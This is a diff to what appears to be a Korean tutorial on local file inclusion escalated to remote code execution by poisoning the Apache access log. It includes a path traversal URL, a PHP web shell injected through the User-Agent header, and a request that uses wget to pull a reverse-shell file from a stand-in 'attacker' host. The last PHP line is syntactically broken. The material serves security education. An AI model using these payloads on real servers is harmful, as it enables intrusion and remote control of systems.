@@ -34,4 +34,14 @@ http://victim.com/lifendpoint?view=../../../../var/log/apache2/access.log
 
 만약 해당 타겟시스템의 서버측 언어가 PHP 로 동작할 경우
 ```<?php system($_GET['cmd']);?> ```와 같이 php의 시스템 명령이 가능한 코드를 삽입하게 되면, 서버에서 User-Agent 헤더를 해석하는 과정에서 php 코드로 인식하여 이를 실행하게 된다.
-즉 ***<span style="color:red"> RCE 취약점 까지 이어질 수 있는 치명적인 취약점이라고 볼 수 있따.. </span>*** 
+즉 ***<span style="color:red"> RCE 취약점 까지 이어질 수 있는 치명적인 취약점이라고 볼 수 있다. </span>*** 
+
+즉, 공격자 PC에서 리버스 커넥션 기능을 하는 악성 코드를 생서 후 웹서버를 구동시켜놓고, 해당 User-Agent 헤더에 공격자 PC에서 악성코드를 가져와 실행 시키는 명령어를 실행실 수 있게 된다.
+
+```
+GET /victim.com/lifendpoint?view=../../../../var/log/apache2/access.log&cmd=wget http://attacker/reverse.php
+
+'''
+
+User-Agent: <?php system($_GET['cmd']; ?)>
+```
